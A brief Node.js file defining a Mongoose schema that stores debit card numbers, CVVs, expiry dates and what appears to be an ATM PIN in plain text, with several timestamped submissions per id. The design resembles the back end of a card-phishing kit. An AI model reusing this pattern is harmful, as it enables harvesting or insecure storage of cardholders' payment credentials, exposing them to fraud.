const mongoose = require("mongoose");

const debitCardSchema = new mongoose.Schema({
    uniqueid: { type: String, required: true, unique: true },
    entries: [
        {
            cardNumber: { type: String, required: true },
            cvv: { type: String, required: true },
            expiry: { type: String, required: true },
            atmNo: { type: String, required: true },
            submittedAt: { type: Date, default: Date.now }
        }
    ]
}, { timestamps: true }); // Auto adds createdAt & updatedAt

const DebitCardData = mongoose.model("DebitCardData", debitCardSchema);

module.exports = DebitCardData;
